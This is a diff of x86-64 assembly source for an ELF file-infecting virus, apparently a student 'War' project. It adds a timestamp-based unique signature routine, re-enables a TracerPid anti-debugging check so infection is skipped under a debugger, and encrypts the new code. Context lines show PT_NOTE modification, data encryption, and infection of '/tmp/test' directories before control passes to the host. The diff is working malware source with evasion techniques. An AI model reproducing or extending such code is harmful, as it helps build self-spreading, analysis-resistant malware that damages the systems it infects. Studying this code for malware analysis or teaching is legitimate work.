@@ -133,6 +133,46 @@ section .text
         ret
     __F_crazy__end:
 
+    __F_set_unique_trace:
+        push rax
+        push rbx
+        push rcx
+        push rdx
+        push rdi
+        push rsi
+        mov rax, SC_GETTIME
+        mov rdi, 0
+        lea rsi, VAR(War.ts)
+        syscall
+        mov rax, VAR(War.ts)
+        mov rdi, 0x1e9
+        mul rdi
+        xor rcx, rcx
+        lea rdi, [rel Traza + 47]
+        .convert:
+            xor rdx, rdx        ; limpiar rdx
+            mov rbx, 10
+            div rbx             ; rax = rax / 10
+                                ; rdx = resto
+            add dl, '0'         ; convertir a ASCII
+           push rdx            ; guardar dígito en stack
+            inc rcx
+            test rax, rax
+            jnz .convert
+        .write_loop:
+            pop rax
+            mov [rdi], al
+            inc rdi
+            loop .write_loop            
+
+        pop rsi
+        pop rdi
+        pop rdx
+        pop rcx
+        pop rbx
+        pop rax
+        ret
+    __F_set_unique_trace__end:
 ; ----------------------------------------------------------------------------------------------------------------------
 
     _init:
@@ -340,8 +380,9 @@ section .text
         jmp .jump_to_host
 
     .check_tracerPid_value:
-       ; cmp byte [rdi], 0x30 ; == "0"
-       ; jne .cleanup_and_jump_to_host_1
+    ; Comentar estas 2 líneas para debug con gdb
+       cmp byte [rdi], 0x30 ; == "0"
+       jne .cleanup_and_jump_to_host_1
 
     .close_status_file_and_infect:
         add rsp, 0x1000
@@ -502,7 +543,7 @@ section .text
         add rsi, rbx
         sub rsi, rcx
         lea rdi, Traza
-        mov rcx, 54
+        mov rcx, 46
         cld                 ; incremental
         rep cmpsb           ; comparar rdi y rsi rcx bytes
         je .munmap
@@ -566,6 +607,7 @@ section .text
     .mod_pt_note:
         CALL_ENCRYPT(mod_pt_note)
 
+        CALL_ENCRYPT(set_unique_trace)
         ; Encriptar data
     .encrypt_data: 
         lea r10, [rel __F_data]         ; base función
@@ -670,7 +712,7 @@ section .text
     dirs            db      0x2F,0x74,0x6D,0x70,0x2F,0x74,0x65,0x73,0x74,0,0x2F,0x74,0x6D,0x70,0x2F,0x74,0x65,0x73,0x74,0x32,0,0  ;"/tmp/test",0,"/tmp/test2",0,0
     __F_data__end:
     Traza_position  equ     _finish - Traza
-    Traza           db      "war version 1.0 (c)oded by tomartin & carce-bo",0  ;46
+    Traza           db      "war version 1.0 (c)oded by tomartin & carce-bo BBBBBBBBBBBB",0  ;46
     host_entrypoint dq      _dummy_host_entrypoint
     virus_vaddr     dq      _start
 
